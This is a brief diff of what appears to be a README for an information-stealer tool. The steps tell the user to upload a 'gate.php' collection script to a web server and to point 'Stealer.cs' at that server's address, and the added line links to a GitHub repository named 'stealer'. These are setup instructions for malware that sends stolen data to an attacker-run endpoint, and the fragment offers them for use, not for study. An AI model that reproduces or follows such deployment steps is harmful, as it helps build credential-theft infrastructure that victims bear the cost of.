@@ -8,4 +8,4 @@ Upload  gate.php  to  web server .
 Change the web server address http://localhost/gate.php in file Stealer.cs
 
 
-
+https://github.com/vnccode/stealer
